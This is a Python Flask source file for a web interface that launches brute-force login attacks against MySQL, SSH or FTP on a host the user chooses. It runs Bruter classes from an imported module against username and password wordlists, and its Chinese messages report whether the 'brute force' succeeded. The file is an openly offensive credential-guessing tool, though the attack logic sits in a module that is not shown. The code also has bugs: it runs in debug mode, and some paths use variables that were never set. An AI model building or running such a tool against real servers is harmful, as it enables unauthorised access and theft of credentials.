from flask import Flask, request, render_template
from wtforms import Form, StringField, validators
from bigbang import MysqlBruter, FtpBruter, SshBruter

app = Flask(__name__)


class LoginForm(Form):
    host = StringField("host", [validators.data_required()])
    type = StringField("type", [validators.data_required()])
    cache_translations = True


@app.route("/", methods=['GET'])
def index():
    myForm = LoginForm(request.form)
    message = "请输入参数"
    return render_template('index.html', message=message, form=myForm)
    return


@app.route("/index", methods=['GET', 'POST'])
def login():
    myForm = LoginForm(request.form)
    print(request.method)
    if request.method == 'POST':
        message = "爆破失败"
        if myForm.host.data and myForm.type.data and myForm.validate():
            host = myForm.host.data
            type = myForm.type.data
            ufile = "username.txt"
            pfile = "password.txt"
            username = ''
            password = ''

            if type == 'mysql':
                mysql = MysqlBruter(host, ufile, pfile)
                results = mysql.run()
                if results:
                    username = results[0].get("username")
                    password = results[0].get("password")
            elif type == 'ssh':
                mysql = SshBruter(host, ufile, pfile)
                results = mysql.run()
                if results:
                    username = results[0].get("username")
                    password = results[0].get("password")
            elif type == 'ftp':
                mysql = FtpBruter(host, ufile, pfile)
                results = mysql.run()
                if results:
                    username = results[0].get("username")
                    password = results[0].get("password")
            else:
                message = "参数错误"
            if username and password:
                message = "爆破成功"
                # return render_template("sucess.html", message=message, username=username, password=password,
                #                        form=myForm)
            # else:
            #     render_template("sucess.html", message=message, form=myForm)
        else:
            message = "type must be ssh or ftp or mysql"
    else:
        message = "请输入参数"
    return render_template('sucess.html', message=message, username=username, password=password, form=myForm)


if __name__ == '__main__':
    app.run(debug=True)
